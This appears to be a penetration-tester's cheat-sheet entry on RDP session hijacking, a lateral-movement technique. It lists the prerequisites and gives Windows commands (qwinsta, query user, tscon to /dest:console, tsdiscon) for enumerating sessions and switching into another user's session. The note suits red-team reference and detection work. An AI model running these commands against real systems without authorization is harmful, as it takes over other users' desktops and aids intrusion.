---
technique: RDP Session Hijacking
category: lateral-movement
targets: Windows Remote Desktop Services
protocols: RDP
remote_capable: false
tags: windows lateral-movement rdp session-hijack tscon
---

# RDP Session Hijacking

RDP session hijacking switches into another interactive session when the operator has sufficient local privileges.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Local admin or SYSTEM | Session switching usually requires elevated local rights |
| Interactive sessions | A target RDP or console session must exist |
| Console access | Hijack lands in an interactive desktop context |

## Windows

### List sessions

#cmd #rdp #sessions

List interactive sessions.

```cmd title:"List RDP sessions"
qwinsta
```
<!-- cheat -->

### Query user sessions

#cmd #rdp #sessions

List user sessions with session IDs.

```cmd title:"Query user sessions"
query user
```
<!-- cheat -->

### Switch to session

#cmd #rdp #tscon

Switch into a target session.

```cmd title:"Switch to RDP session"
tscon "$session_id" /dest:console
```
<!-- cheat
var session_id
-->

### Disconnect session

#cmd #rdp #sessions

Disconnect a target session by ID.

```cmd title:"Disconnect RDP session"
tsdiscon "$session_id"
```
<!-- cheat
var session_id
-->

## Linux

No Linux operator command is included here. This note covers Windows RDP session hijacking.
